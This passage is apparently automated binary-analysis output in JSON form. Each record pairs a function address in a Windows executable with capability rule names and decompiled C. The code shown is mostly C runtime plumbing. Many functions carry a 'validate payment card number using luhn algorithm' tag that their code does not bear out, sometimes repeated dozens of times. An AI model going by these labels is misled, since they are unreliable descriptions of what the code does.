        "decompiled_code": "\nint32_t fcn.0041bdd3(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = (*_sym.imp.KERNEL32.dll_GetEnvironmentStringsW)();\n    iVar1 = arg_8h;\n    if (arg_8h != 0) {\n        iVar1 = fcn.0041bd9c(arg_8h);\n        iVar2 = iVar1 - arg_8h >> 1;\n        arg_8h_00 = fcn.0041aa21(0, 0, arg_8h, iVar2, 0, 0, 0, 0);\n        if (arg_8h_00 == 0) {\n            (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg_8h);\n            iVar1 = 0;\n        }\n        else {\n            iVar1 = fcn.00414556(arg_8h_00);\n            if (iVar1 == 0) {\n                fcn.0041451c(0);\n                (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg_8h);\n                iVar1 = 0;\n            }\n            else {\n                iVar2 = fcn.0041aa21(0, 0, arg_8h, iVar2, iVar1, arg_8h_00, 0, 0);\n                if (iVar2 == 0) {\n                    fcn.0041451c(iVar1);\n                    iVar1 = 0;\n                }\n                else {\n                    fcn.0041451c(0);\n                }\n                (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsW)(arg_8h);\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 409
    },
    "0041c1f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0041c1f0(char *arg_8h, int32_t arg_ch)\n\n{\n    uint32_t arg_ch_00;\n    char cVar1;\n    char cVar2;\n    code *pcVar3;\n    uint *puVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    uint uVar9;\n    char *pcVar10;\n    char *arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (arg_8h == NULL) {\n        puVar4 = fcn.0040e0ee();\n        *puVar4 = 0x16;\n        return 0xffffffff;\n    }\n    pcVar5 = fcn.004231f0(arg_8h, 0x3d);\n    if ((pcVar5 == NULL) || (pcVar5 == arg_8h)) {\n        puVar4 = fcn.0040e0ee();\n        *puVar4 = 0x16;\n        fcn.0041451c(arg_8h);\n        return 0xffffffff;\n    }\n    cVar1 = pcVar5[1];\n    fcn.0041c181();\n    uVar9 = 0;\n    if (*0x48fa90 == NULL) {\n        if ((arg_ch != 0) && (*0x48fa94 != 0)) {\n            iVar6 = fcn.00410c3e();\n            if (iVar6 == 0) {\n                puVar4 = fcn.0040e0ee();\n                *puVar4 = 0x16;\n                goto code_r0x0041beed;\n            }\n            fcn.0041c181();\n            goto code_r0x0041bf48;\n        }\n        if (cVar1 == '\\0') goto code_r0x0041c092;\n        *0x48fa90 = fcn.004144bf(1, 4);\n        fcn.0041451c(0);\n        if (*0x48fa90 != NULL) {\n            if (*0x48fa94 == 0) {\n                *0x48fa94 = fcn.004144bf(1, 4);\n                fcn.0041451c(0);\n                if (*0x48fa94 == 0) goto code_r0x0041beed;\n            }\n            goto code_r0x0041bf48;\n        }\n    }\n    else {\ncode_r0x0041bf48:\n        piVar7 = *0x48fa90;\n        if (*0x48fa90 != NULL) {\n            iVar6 = fcn.0041c19b(arg_8h, pcVar5 - arg_8h);\n            if ((-1 < iVar6) && (*piVar7 != 0)) {\n                fcn.0041451c(piVar7[iVar6]);\n                if (cVar1 == '\\0') {\n                    for (; piVar7[iVar6] != 0; iVar6 = iVar6 + 1) {\n                        piVar7[iVar6] = piVar7[iVar6 + 1];\n                    }\n                    piVar7 = fcn.0041e78e(piVar7, iVar6, 4);\n                    fcn.0041451c(0);\n                    arg_8h_00 = arg_8h;\n                    if (piVar7 != NULL) {\ncode_r0x0041c00c:\n                        *0x48fa90 = piVar7;\n                    }\n                }\n                else {\n                    arg_8h_00 = NULL;\n                    piVar7[iVar6] = arg_8h;\n                }\n                if (arg_ch == 0) {\ncode_r0x0041c0a2:\n                    fcn.0041451c(arg_8h_00);\n                    return 0;\n                }\n                pcVar10 = arg_8h;\n                do {\n                    cVar2 = *pcVar10;\n                    pcVar10 = pcVar10 + 1;\n                } while (cVar2 != '\\0');\n                iVar6 = fcn.004144bf(pcVar10 + (2 - (arg_8h + 1)), 1);\n                if (iVar6 == 0) {\n                    fcn.0041451c(0);\n                    arg_8h = arg_8h_00;\n                }\n                else {\n                    iVar8 = fcn.00412d4a(iVar6, pcVar10 + (2 - (arg_8h + 1)), arg_8h);\n                    if (iVar8 != 0) {\n                        fcn.0040b84c(0, 0, 0, 0, 0);\n                        pcVar3 = swi(3);\n                        uVar9 = (*pcVar3)();\n                        return uVar9;\n                    }\n                    (pcVar5 + (iVar6 - arg_8h) + 1)[-1] = '\\0';\n                    iVar8 = fcn.00421a84(iVar6, -(cVar1 != '\\0') & pcVar5 + (iVar6 - arg_8h) + 1);\n                    if (iVar8 != 0) {\n                        fcn.0041451c(iVar6);\n                        goto code_r0x0041c0a2;\n                    }\n                    puVar4 = fcn.0040e0ee();\n                    *puVar4 = 0x2a;\n                    fcn.0041451c(iVar6);\n                    uVar9 = 0xffffffff;\n                    arg_8h = arg_8h_00;\n                }\n                goto code_r0x0041c092;\n            }\n            if (cVar1 == '\\0') goto code_r0x0041c092;\n            arg_ch_00 = -iVar6 + 2;\n            if ((-iVar6 <= arg_ch_00) && (arg_ch_00 < 0x3fffffff)) {\n                piVar7 = fcn.0041e78e(piVar7, arg_ch_00, 4);\n                fcn.0041451c(0);\n                if (piVar7 != NULL) {\n                    piVar7[-iVar6] = arg_8h;\n                    piVar7[1 - iVar6] = 0;\n                    arg_8h_00 = NULL;\n                    goto code_r0x0041c00c;\n                }\n            }\n        }\n    }\ncode_r0x0041beed:\n    uVar9 = 0xffffffff;\ncode_r0x0041c092:\n    fcn.0041451c(arg_8h);\n    return uVar9;\n}\n",
        "token_count": 1485
    },
    "0041cbff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041cbff(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    \n    puVar1 = arg_8h + arg_ch;\n    for (; arg_8h != puVar1; arg_8h = arg_8h + 1) {\n        fcn.0041451c(*arg_8h);\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "0041dc34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041dc34(int16_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t **arg_8h_00;\n    int16_t **arg_10h_00;\n    int16_t *arg_10h_01;\n    ushort *arg_8h_01;\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_02;\n    uint uVar5;\n    int16_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.004137e0();\n    arg_8h_00 = iVar3 + 0x50;\n    arg_10h_01 = iVar3 + 0x2a0;\n    *(iVar3 + 0x58) = 0;\n    *arg_10h_01 = 0;\n    arg_10h_00 = iVar3 + 0x54;\n    *arg_8h_00 = arg_8h;\n    *arg_10h_00 = arg_8h + 0x40;\n    piVar6 = arg_8h;\n    if (arg_8h[0x40] != 0) {\n        fcn.0041dbc7(0x4287e0, 0x16, arg_10h_00);\n        piVar6 = *arg_8h_00;\n    }\n    if (*piVar6 == 0) {\n        fcn.0041d538(arg_8h_00);\n    }\n    else {\n        if (**arg_10h_00 == 0) {\n            fcn.0041d658(arg_8h_00);\n        }\n        else {\n            fcn.0041d5bf(arg_8h_00);\n        }\n        if ((*(iVar3 + 0x58) == 0) && (iVar4 = fcn.0041dbc7(0x4284d0, 0x40, arg_8h_00),  iVar4 != 0)) {\n            if (**arg_10h_00 == 0) {\n                fcn.0041d658(arg_8h_00);\n            }\n            else {\n                fcn.0041d5bf(arg_8h_00);\n            }\n        }\n    }\n    if (*(iVar3 + 0x58) != 0) {\n        if ((*arg_8h == 0) && (arg_8h[0x80] == 0)) {\n            arg_8h_02 = (*_sym.imp.KERNEL32.dll_GetACP)();\n        }\n        else {\n            arg_8h_02 = fcn.0041da84(arg_8h + 0x80, arg_8h_00);\n        }\n        if (((arg_8h_02 != 0) && (arg_8h_02 != 65000)) &&\n           (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h_02 & 0xffff),  iVar4 != 0)) {\n            if (arg_ch != NULL) {\n                *arg_ch = arg_8h_02;\n            }\n            if (arg_10h == 0) {\n                return 1;\n            }\n            arg_8h_01 = arg_10h + 0x120;\n            *arg_8h_01 = 0;\n            piVar6 = arg_10h_01;\n            do {\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            iVar3 = fcn.0041ae1a(arg_8h_01, 0x55, arg_10h_01, (piVar6 - (iVar3 + 0x2a2) >> 1) + 1);\n            if (iVar3 != 0) {\ncode_r0x0041de22:\n                fcn.0040b84c(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                uVar5 = (*pcVar2)();\n                return uVar5;\n            }\n            iVar3 = fcn.00415ccd(arg_8h_01, 0x1001, arg_10h, 0x40);\n            if (iVar3 != 0) {\n                iVar3 = arg_10h + 0x80;\n                iVar4 = fcn.00415ccd(arg_10h + 0x120, 0x1002, iVar3, 0x40);\n                if ((iVar4 != 0) &&\n                   (((iVar4 = fcn.0042331b(iVar3, 0x5f),  iVar4 == 0 && (iVar4 = fcn.0042331b(iVar3, 0x2e),  iVar4 == 0)\n                     ) || (iVar3 = fcn.00415ccd(arg_10h + 0x120, 7, iVar3, 0x40),  iVar3 != 0)))) {\n                    if (arg_8h_02 != 0xfde9) {\n                        fcn.00421c3e(arg_8h_02, arg_10h + 0x100, 0x10, 10);\n                        return 1;\n                    }\n                    iVar3 = fcn.0041ae1a(arg_10h + 0x100, 0x10, L\"utf8\", 5);\n                    if (iVar3 == 0) {\n                        return 1;\n                    }\n                    goto code_r0x0041de22;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1281
    },
    "0041e370": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041e370(uint16_t *arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    uVar1 = *arg_8h;\n    while (uVar1 != 0) {\n        arg_8h = arg_8h + 1;\n        if (uVar1 - 0x61 < 6) {\n            uVar1 = uVar1 - 0x27;\n        }\n        else if (uVar1 - 0x41 < 6) {\n            uVar1 = uVar1 - 7;\n        }\n        iVar2 = iVar2 * 0x10 + -0x30 + uVar1;\n        uVar1 = *arg_8h;\n    }\n    return iVar2;\n}\n",
        "token_count": 185
    },
    "0041ee51": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041ee51(char *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint *arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    char *arg_8h_00;\n    char cVar1;\n    int32_t iVar2;\n    char *arg_ch_00;\n    char *pcVar3;\n    uint uVar4;\n    uint var_4h;\n    \n    if (arg_8h == NULL) {\n        *(arg_20h + 0x1c) = 1;\n        *(arg_20h + 0x18) = 0x16;\n        fcn.0040b7a2(0, 0, 0, 0, 0, arg_20h);\n        return 0x16;\n    }\n    if (arg_ch != 0) {\n        *arg_8h = '\\0';\n        iVar2 = arg_10h;\n        if (arg_10h < 1) {\n            iVar2 = 0;\n        }\n        if (arg_ch <= iVar2 + 1U) {\n            uVar4 = 0x22;\n            goto code_r0x0041eeaa;\n        }\n        if (arg_14h != NULL) {\n            arg_8h_00 = arg_14h[2];\n            pcVar3 = arg_8h + 1;\n            *arg_8h = '0';\n            arg_ch_00 = arg_8h_00;\n            if (0 < arg_10h) {\n                do {\n                    cVar1 = *arg_ch_00;\n                    if (cVar1 == '\\0') {\n                        cVar1 = '0';\n                    }\n                    else {\n                        arg_ch_00 = arg_ch_00 + 1;\n                    }\n                    *pcVar3 = cVar1;\n                    pcVar3 = pcVar3 + 1;\n                    arg_10h = arg_10h + -1;\n                } while (0 < arg_10h);\n            }\n            *pcVar3 = '\\0';\n            if ((-1 < arg_10h) &&\n               (cVar1 = fcn.0041edd3(arg_8h_00, arg_ch_00, *arg_14h, arg_18h, arg_1ch),  cVar1 != '\\0')) {\n                while( true ) {\n                    pcVar3 = pcVar3 + -1;\n                    if (*pcVar3 != '9') break;\n                    *pcVar3 = '0';\n                }\n                *pcVar3 = *pcVar3 + '\\x01';\n            }\n            if (*arg_8h == '1') {\n                arg_14h[1] = arg_14h[1] + 1;\n            }\n            else {\n                pcVar3 = arg_8h + 1;\n                do {\n                    cVar1 = *pcVar3;\n                    pcVar3 = pcVar3 + 1;\n                } while (cVar1 != '\\0');\n                fcn.00408060(arg_8h, arg_8h + 1, pcVar3 + (1 - (arg_8h + 2)));\n            }\n            return 0;\n        }\n    }\n    uVar4 = 0x16;\ncode_r0x0041eeaa:\n    *(arg_20h + 0x18) = uVar4;\n    *(arg_20h + 0x1c) = 1;\n    fcn.0040b7a2(0, 0, 0, 0, 0, arg_20h);\n    return uVar4;\n}\n",
        "token_count": 812
    },
    "00420560": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00420560(ushort *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint32_t uVar1;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.00422133(&var_4h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (uVar1 < 5) {\n        if (0xffff < var_4h) {\n            var_4h = 0xfffd;\n        }\n        if (arg_8h != NULL) {\n            *arg_8h = var_4h;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 166
    },
    "00421c71": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00421c71(uint16_t *arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (arg_10h != 0) {\n        do {\n            uVar1 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            if (uVar1 - 0x41 < 0x1a) {\n                uVar1 = uVar1 + 0x20;\n            }\n            uVar2 = *arg_ch;\n            arg_ch = arg_ch + 1;\n            if (uVar2 - 0x41 < 0x1a) {\n                uVar2 = uVar2 + 0x20;\n            }\n        } while (((uVar1 - uVar2 == 0) && (uVar1 != 0)) && (arg_10h = arg_10h + -1,  arg_10h != 0));\n        return uVar1 - uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 250
    },
    "00422d70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00422d70(int16_t *arg_8h)\n\n{\n    if ((*arg_8h == 0x5a4d) && (*(*(arg_8h + 0x1e) + arg_8h) == 0x4550)) {\n        return *(*(arg_8h + 0x1e) + arg_8h + 6) == 0x10b;\n    }\n    return false;\n}\n",
        "token_count": 103
    },
    "0040801c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040801c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040aba3(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "00404be4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404be4(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0) {\n        if (iVar1 < 8) {\n            fcn.004069a1(iVar1 * 0x18 + 0x48f148);\n        }\n        return;\n    }\n    fcn.0040d717(4);\n    return;\n}\n",
        "token_count": 103
    },
    "0040c664": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c664(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint *in_ECX;\n    \n    in_ECX[2] = arg_18h;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[0x10f] = 0;\n    in_ECX[0x110] = 0;\n    in_ECX[5] = 0;\n    *(in_ECX + 6) = 0;\n    in_ECX[7] = 0;\n    in_ECX[8] = 0;\n    in_ECX[9] = 0;\n    *(in_ECX + 0xb) = 0;\n    in_ECX[0xd] = 0;\n    *(in_ECX + 0xe) = 0;\n    in_ECX[0x112] = *arg_8h;\n    *in_ECX = arg_ch;\n    in_ECX[3] = arg_14h;\n    in_ECX[4] = arg_1ch;\n    in_ECX[1] = arg_10h;\n    return;\n}\n",
        "token_count": 302
    },
    "0040b513": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b513(uint *arg_8h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint uVar2;\n    \n    *(in_ECX + 5) = 0;\n    *in_ECX = 0;\n    *(in_ECX + 2) = 0;\n    *(in_ECX + 7) = 0;\n    *(in_ECX + 9) = 0;\n    if (arg_8h == NULL) {\n        uVar1 = *0x48e470;\n        uVar2 = *0x48e474;\n        if (*0x48fac4 != 0) {\n            return;\n        }\n    }\n    else {\n        uVar1 = *arg_8h;\n        uVar2 = arg_8h[1];\n    }\n    *(in_ECX + 5) = 1;\n    in_ECX[4] = uVar2;\n    in_ECX[3] = uVar1;\n    return;\n}\n",
        "token_count": 224
    },
    "0042239a": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0042239a(void)\n\n{\n    *0x48ec80 = (*_sym.imp.KERNEL32.dll_CreateFileW)(L\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00401850": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuchar (*) [16] __thiscall fcn.00401850(uchar (*param_1) [16], char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    *param_1 = ZEXT816(0);\n    *param_1[1] = 0;\n    *(param_1[1] + 4) = 0;\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00401330(param_2, pcVar2 - (param_2 + 1));\n    return param_1;\n}\n",
        "token_count": 161
    },
    "00405003": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405003(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00404b8c(0);\n    iVar4 = *(arg_8h + 0xc);\n    while (iVar4 != 0) {\n        iVar4 = iVar4 + -1;\n        piVar1 = *(*(arg_8h + 8) + iVar4 * 4);\n        if (piVar1 != NULL) {\n            pcVar2 = *(*piVar1 + 8);\n            (**0x424130)();\n            puVar3 = (*pcVar2)();\n            if (puVar3 != NULL) {\n                pcVar2 = **puVar3;\n                (**0x424130)(1);\n                (*pcVar2)();\n            }\n        }\n    }\n    fcn.0040b985(*(arg_8h + 8));\n    fcn.00404be4();\n    return;\n}\n",
        "token_count": 243
    },
    "0040c709": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c709(char *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    char *pcVar3;\n    \n    cVar1 = *arg_8h;\n    while ((cVar1 != '\\0' && (cVar1 != ***(*arg_ch + 0x88)))) {\n        arg_8h = arg_8h + 1;\n        cVar1 = *arg_8h;\n    }\n    if (cVar1 != '\\0') {\n        do {\n            arg_8h = arg_8h + 1;\n            cVar1 = *arg_8h;\n            pcVar2 = arg_8h;\n            if ((cVar1 == '\\0') || (cVar1 == 'e')) break;\n        } while (cVar1 != 'E');\n        do {\n            pcVar3 = pcVar2;\n            pcVar2 = pcVar3 + -1;\n        } while (*pcVar2 == '0');\n        if (*pcVar2 == ***(*arg_ch + 0x88)) {\n            pcVar2 = pcVar3 + -2;\n        }\n        do {\n            cVar1 = *arg_8h;\n            arg_8h = arg_8h + 1;\n            pcVar2 = pcVar2 + 1;\n            *pcVar2 = cVar1;\n        } while (cVar1 != '\\0');\n    }\n    return;\n}\n",
        "token_count": 327
    },
    "00412d4a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412d4a(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    char *pcVar3;\n    uint uStack16;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        if (arg_10h != 0) {\n            pcVar3 = arg_8h;\n            do {\n                cVar1 = pcVar3[arg_10h - arg_8h];\n                *pcVar3 = cVar1;\n                pcVar3 = pcVar3 + 1;\n                if (cVar1 == '\\0') {\n                    return 0;\n                }\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            *arg_8h = '\\0';\n            puVar2 = fcn.0040e0ee();\n            uStack16 = 0x22;\n            goto code_r0x00412d70;\n        }\n        *arg_8h = '\\0';\n    }\n    puVar2 = fcn.0040e0ee();\n    uStack16 = 0x16;\ncode_r0x00412d70:\n    *puVar2 = uStack16;\n    fcn.0040b81f();\n    return uStack16;\n}\n",
        "token_count": 302
    },
    "00416c71": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00416c71(int16_t *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    int16_t *piVar3;\n    uint uStack16;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        if (arg_10h != 0) {\n            piVar3 = arg_8h;\n            do {\n                iVar1 = *((arg_10h - arg_8h) + piVar3);\n                *piVar3 = iVar1;\n                piVar3 = piVar3 + 1;\n                if (iVar1 == 0) {\n                    return 0;\n                }\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            *arg_8h = 0;\n            puVar2 = fcn.0040e0ee();\n            uStack16 = 0x22;\n            goto code_r0x00416c99;\n        }\n        *arg_8h = 0;\n    }\n    puVar2 = fcn.0040e0ee();\n    uStack16 = 0x16;\ncode_r0x00416c99:\n    *puVar2 = uStack16;\n    fcn.0040b81f();\n    return uStack16;\n}\n",
        "token_count": 306
    },
    "00410ed5": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410ed5(uint uExitCode)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    \n    cVar2 = fcn.00410f49();\n    if (cVar2 != '\\0') {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(uExitCode);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar3);\n    }\n    fcn.00410f6b(uExitCode);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(uExitCode);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 152
    }
}